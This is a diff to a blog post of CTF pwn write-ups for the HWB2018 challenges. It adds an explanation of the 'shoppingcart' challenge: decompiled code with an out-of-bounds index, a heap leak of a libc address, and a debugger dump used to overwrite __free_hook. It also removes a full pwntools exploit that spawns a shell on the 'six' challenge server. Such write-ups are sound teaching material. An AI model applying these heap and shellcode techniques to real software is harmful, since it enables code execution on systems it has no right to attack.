@@ -69,7 +69,7 @@
 
 <meta itemprop="datePublished" content="2018-10-13T22:29:11&#43;08:00" />
 <meta itemprop="dateModified" content="2018-10-13T22:29:11&#43;08:00" />
-<meta itemprop="wordCount" content="2026">
+<meta itemprop="wordCount" content="1967">
 
 
 
@@ -313,8 +313,8 @@
             <a href="https://bash-c.github.io/categories/writeup/"> writeup </a>
             
           </div>
-        <span class="more-meta"> 2026 words </span>
-          <span class="more-meta"> 5 min read </span>
+        <span class="more-meta"> 1967 words </span>
+          <span class="more-meta"> 4 min read </span>
 
         
         
@@ -362,8 +362,99 @@
 
 <h2 id="shoppingcart">shoppingcart</h2>
 
-<p>这道题目真是坑了很久，看到 <code>strtoul</code> 就没想通过负数数组越界了，后来发现可以负数越界时已经来不及写 exp 了。</p>
+<p><a href="https://github.com/bash-c/pwn_repo/tree/master/HWB2018_shoppingcart">binary &amp; exploit here</a></p>
 
+<p>这道题目真是坑了很久，看到 <code>strtoul</code> 就没想通过负数数组越界了，后来发现可以负数越界时已经来不及写 exp 了。比赛结束后通过堆风水解出了题目，后来看 <a href="https://xz.aliyun.com/t/2893#toc-6">白泽</a> 的师傅的解法时，发现更简单，这里就介绍一下师傅的解法，用到了 libc 的 got 机制。</p>
+
+<p>漏洞出现在 edit 功能里，存在数组越界，可以通过这个功能来 leak 和 overwrite。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">edit</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// rax
+</span><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// ST00_8
+</span><span class="c1"></span>  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">24</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-20h]
+</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]
+</span><span class="c1"></span>
+  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Which goods you need to modify?&#34;</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+  <span class="n">idx</span> <span class="o">=</span> <span class="n">strtoul</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;OK, what would you like to modify %s to?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">good_list</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">good</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
+  <span class="n">good_list</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">good</span><span class="p">[</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">good_list</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">good</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>leak 时可以用 <code>malloc(0)</code>，这样在输入时 fd 就不会被 <code>\0</code> 截断</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;How long is your goods name?&#34;</span><span class="p">);</span>
+    <span class="n">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+    <span class="n">size</span> <span class="o">=</span> <span class="n">strtoul</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">p_g</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">GOOD</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10uLL</span><span class="p">);</span>
+    <span class="n">p_g</span><span class="o">-&gt;</span><span class="n">money</span> <span class="o">=</span> <span class="mi">999LL</span><span class="p">;</span>
+    <span class="n">p_g</span><span class="o">-&gt;</span><span class="n">good</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;What is your goods name?&#34;</span><span class="p">);</span>
+    <span class="n">p_g</span><span class="o">-&gt;</span><span class="n">good</span><span class="p">[(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p_g</span><span class="o">-&gt;</span><span class="n">good</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="o">//</span> <span class="n">size</span> <span class="o">==</span> <span class="mi">0</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>这样通过 unsorted bin leak 就能 leak 出一个和 <a href="https://github.com/bash-c/main_arena_offset#install">main_arena</a> 相关的地址，通过这个地址可以找到 libc 的基址。</p>
+
+<p>leak 完之后再次通过越界写改 <code>__free_hook</code> 即可，我的做法是通过堆风水，比较麻烦。后来发现白泽的师傅使用了 <code>libc.got['__free_hook']</code>，改写 <code>__free_hook</code> 的 got，这样实现起来就方便很多了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">codebase</span> 
+<span class="no">codebase</span> <span class="p">:</span> <span class="mi">0x55d24159a000</span>
+<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">telescope</span> <span class="p">(</span><span class="mi">0x2021E0</span><span class="err">+</span><span class="mi">0x55d24159a000</span><span class="p">-</span><span class="mi">0xb0</span><span class="p">)</span> 
+<span class="mi">00</span><span class="p">:</span><span class="mi">0000</span><span class="err">│</span>   <span class="mi">0x55d24179c130</span> <span class="err">◂—</span> <span class="mi">0xa3831</span> <span class="err">/</span><span class="p">*</span> <span class="err">&#39;</span><span class="mi">18</span><span class="err">\</span><span class="no">n</span><span class="err">&#39;</span> <span class="p">*</span><span class="err">/</span>
+<span class="err">01:0008│</span>   <span class="err">0</span><span class="nf">x55d24179c138</span> <span class="err">—▸</span> <span class="mi">0x7f9aa4cbcef8</span> <span class="err">—▸</span> <span class="mi">0x7f9aa4cbf7a8</span> <span class="p">(</span><span class="no">__free_hook</span><span class="p">)</span> <span class="err">◂—</span> <span class="mi">0x0</span>
+<span class="err">02:0010│</span>   <span class="err">0</span><span class="nf">x55d24179c140</span> <span class="err">—▸</span> <span class="mi">0x55d241c32400</span> <span class="err">◂—</span> <span class="mi">0x0</span>
+<span class="err">03:0018│</span>   <span class="err">0</span><span class="nf">x55d24179c148</span> <span class="err">—▸</span> <span class="mi">0x55d241c32450</span> <span class="err">—▸</span> <span class="mi">0x55d24179c0a8</span> <span class="err">◂—</span> <span class="mi">0xa31</span> <span class="err">/</span><span class="p">*</span> <span class="err">&#39;</span><span class="mi">1</span><span class="err">\</span><span class="no">n</span><span class="err">&#39;</span> <span class="p">*</span><span class="err">/</span>
+<span class="err">04:0020│</span>   <span class="err">0</span><span class="nf">x55d24179c150</span> <span class="err">—▸</span> <span class="mi">0x55d241c32470</span> <span class="err">—▸</span> <span class="mi">0x55d24179c0b0</span> <span class="err">◂—</span> <span class="mi">0xa32</span> <span class="err">/</span><span class="p">*</span> <span class="err">&#39;</span><span class="mi">2</span><span class="err">\</span><span class="no">n</span><span class="err">&#39;</span> <span class="p">*</span><span class="err">/</span>
+<span class="err">05:0028│</span>   <span class="err">0</span><span class="nf">x55d24179c158</span> <span class="err">—▸</span> <span class="mi">0x55d241c32490</span> <span class="err">—▸</span> <span class="mi">0x55d24179c0b8</span> <span class="err">◂—</span> <span class="mi">0xa33</span> <span class="err">/</span><span class="p">*</span> <span class="err">&#39;</span><span class="mi">3</span><span class="err">\</span><span class="no">n</span><span class="err">&#39;</span> <span class="p">*</span><span class="err">/</span>
+<span class="err">06:0030│</span>   <span class="err">0</span><span class="nf">x55d24179c160</span> <span class="err">—▸</span> <span class="mi">0x55d241c324b0</span> <span class="err">—▸</span> <span class="mi">0x55d24179c0c0</span> <span class="err">◂—</span> <span class="mi">0xa34</span> <span class="err">/</span><span class="p">*</span> <span class="err">&#39;</span><span class="mi">4</span><span class="err">\</span><span class="no">n</span><span class="err">&#39;</span> <span class="p">*</span><span class="err">/</span>
+<span class="err">07:0038│</span>   <span class="err">0</span><span class="nf">x55d24179c168</span> <span class="err">—▸</span> <span class="mi">0x55d241c324d0</span> <span class="err">—▸</span> <span class="mi">0x55d24179c0c8</span> <span class="err">◂—</span> <span class="mi">0xa35</span> <span class="err">/</span><span class="p">*</span> <span class="err">&#39;</span><span class="mi">5</span><span class="err">\</span><span class="no">n</span><span class="err">&#39;</span> <span class="p">*</span><span class="err">/</span></code></pre></td></tr></table>
+</div>
+</div>
 <h2 id="huwang">huwang</h2>
 
 <p><a href="https://github.com/bash-c/pwn_repo/tree/master/HWB2018_huwang">binary &amp; exploit here</a></p>
@@ -511,6 +602,8 @@
 
 <h2 id="six">six</h2>
 
+<p><a href="https://github.com/bash-c/pwn_repo/tree/master/HWB2018_six">binary &amp; exploit here</a></p>
+
 <blockquote>
 <p>总觉得这道题目以前在哪里见过，忘了是哪次比赛的了。</p>
 </blockquote>
@@ -646,152 +739,7 @@
 </div>
 <p>这段 shellcode 是符合要求的。</p>
 
-<p>当两次 mmap 的距离比较近时，就可以通过第二次 read 来覆盖 shellcode，进而控制 rip。能控制 rip 的话，直接控制 rip 到我们写的 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> 即可。</p>
-
-<p>我的 exp 如下：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">HWB2018_six</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> <span class="n">bat</span> <span class="n">solve</span><span class="o">.</span><span class="n">py</span> 
-<span class="err">───────┬─────────────────────────────────────────────────────────────────────────────────</span>
-       <span class="err">│</span> <span class="n">File</span><span class="p">:</span> <span class="n">solve</span><span class="o">.</span><span class="n">py</span>
-<span class="err">───────┼─────────────────────────────────────────────────────────────────────────────────</span>
-   <span class="mi">1</span>   <span class="err">│</span> <span class="ch">#!/usr/bin/env python</span>
-   <span class="mi">2</span>   <span class="err">│</span> <span class="c1"># -*- coding: utf-8 -*-</span>
-   <span class="mi">3</span>   <span class="err">│</span> 
-   <span class="mi">4</span>   <span class="err">│</span> <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-   <span class="mi">5</span>   <span class="err">│</span> <span class="kn">import</span> <span class="nn">sys</span>
-   <span class="mi">6</span>   <span class="err">│</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&#34;./six&#34;</span>
-   <span class="mi">7</span>   <span class="err">│</span> <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>
-   <span class="mi">8</span>   <span class="err">│</span> <span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;deepin-terminal&#34;</span><span class="p">,</span> <span class="s2">&#34;-x&#34;</span><span class="p">,</span> <span class="s2">&#34;sh&#34;</span><span class="p">,</span> <span class="s2">&#34;-c&#34;</span><span class="p">]</span>
-   <span class="mi">9</span>   <span class="err">│</span> 
-  <span class="mi">10</span>   <span class="err">│</span> <span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;l&#34;</span><span class="p">:</span>
-  <span class="mi">11</span>   <span class="err">│</span>     <span class="c1">#  io = process(&#34;./six&#34;)</span>
-  <span class="mi">12</span>   <span class="err">│</span>     <span class="n">io</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&#34;./six&#34;</span><span class="p">,</span> <span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
-</span><span class="s1">  13   │             bpie 0xC95
-</span><span class="s1">  14   │             c
-</span><span class="s1">  15   │             si 
-</span><span class="s1">  16   │             si 
-</span><span class="s1">  17   │             si 
-</span><span class="s1">  18   │             si 
-</span><span class="s1">  19   │             si 
-</span><span class="s1">  20   │             si 
-</span><span class="s1">  21   │             si 
-</span><span class="s1">  22   │             si 
-</span><span class="s1">  23   │             si 
-</span><span class="s1">  24   │             si 
-</span><span class="s1">  25   │             si 
-</span><span class="s1">  26   │             si 
-</span><span class="s1">  27   │             si 
-</span><span class="s1">  28   │             si 
-</span><span class="s1">  29   │             si 
-</span><span class="s1">  30   │             si 
-</span><span class="s1">  31   │             si 
-</span><span class="s1">  32   │             si 
-</span><span class="s1">  33   │             si 
-</span><span class="s1">  34   │             si 
-</span><span class="s1">  35   │             &#39;&#39;&#39;</span><span class="p">)</span>
-  <span class="mi">36</span> <span class="o">+</span> <span class="err">│</span> 
-  <span class="mi">37</span>   <span class="err">│</span> <span class="k">else</span><span class="p">:</span>
-  <span class="mi">38</span>   <span class="err">│</span>     <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;49.4.79.0&#34;</span><span class="p">,</span> <span class="mi">31166</span><span class="p">)</span>
-  <span class="mi">39</span>   <span class="err">│</span> 
-  <span class="mi">40</span>   <span class="err">│</span> <span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
-  <span class="mi">41</span>   <span class="err">│</span>     <span class="n">read</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;
-</span><span class="s1">  42   │             push rsp
-</span><span class="s1">  43   │             pop rsi
-</span><span class="s1">  44   │             mov edx, esi
-</span><span class="s1">  45   │             syscall
-</span><span class="s1">  46   │             &#39;&#39;&#39;</span><span class="p">)</span>
-  <span class="mi">47</span>   <span class="err">│</span>     <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">read</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">7</span>
-  <span class="mi">48</span>   <span class="err">│</span>     <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;shellcode:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">read</span><span class="p">)</span>
-  <span class="mi">49</span>   <span class="err">│</span> 
-  <span class="mi">50</span>   <span class="err">│</span>     <span class="n">shell</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;
-</span><span class="s1">  51   │             mov eax, 0x3b
-</span><span class="s1">  52   │             mov rdi, rsi
-</span><span class="s1">  53   │             xor rdx, rdx
-</span><span class="s1">  54   │             xor rsi, rsi
-</span><span class="s1">  55   │             syscall
-</span><span class="s1">  56   │             &#39;&#39;&#39;</span><span class="p">)</span>
-  <span class="mi">57</span>   <span class="err">│</span> 
-  <span class="mi">58</span>   <span class="err">│</span>     <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;/bin/sh</span><span class="se">\0</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xb36</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">shell</span>
-  <span class="mi">59</span>   <span class="err">│</span>     <span class="c1">#  pause()</span>
-  <span class="mi">60</span>   <span class="err">│</span>     <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-  <span class="mi">61</span>   <span class="err">│</span> 
-  <span class="mi">62</span>   <span class="err">│</span>     <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-  <span class="mi">63</span>   <span class="err">│</span>     <span class="c1"># $ while true; do python exp.py r; done</span>
-<span class="err">───────┴─────────────────────────────────────────────────────────────────────────────────</span></code></pre></td></tr></table>
-</div>
-</div>
-<p>成功率不是 100% 但也相当可观了。</p>
+<p>当两次 mmap 的距离比较近时，就可以通过第二次 read 来覆盖 shellcode，进而控制 rip。能控制 rip 的话，直接控制 rip 到我们写的 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> 即可。成功率不是 100% 但也相当可观了。</p>
 
 <h2 id="calendar">calendar</h2>
 
